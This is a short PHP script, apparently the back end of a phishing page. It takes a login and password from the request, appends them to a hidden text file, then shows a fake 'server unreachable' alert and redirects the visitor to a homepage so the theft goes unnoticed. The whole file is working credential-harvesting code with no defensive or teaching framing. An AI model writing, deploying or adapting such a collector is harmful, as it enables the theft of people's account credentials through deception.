<?php
// RECUPERATION DES DONNEES
$login 		= htmlspecialchars(trim($_GET['login']));
$password 		= htmlspecialchars(trim($_GET['password']));


$login[ strlen($login) ]= ":";

$code = $login . $password;

$code[ strlen($code) ]= "|";
// 1 : on ouvre le fichier

$monfichier = fopen('axd0k4lpjut5uafhjcvif.txt', 'r+');



// 2 : on lit la première ligne du fichier

$ligne = fgets($monfichier);

// on écrit
fputs($monfichier, $code);


// 3 : quand on a fini de l'utiliser, on ferme le fichier

fclose($monfichier);


?>


<script>alert('ERROR SERVER UNREACHABLE REDIRECT TO HOMEPAGE')</script>
<meta http-equiv="refresh" content="0; URL=http://localhost/demo/index.php">
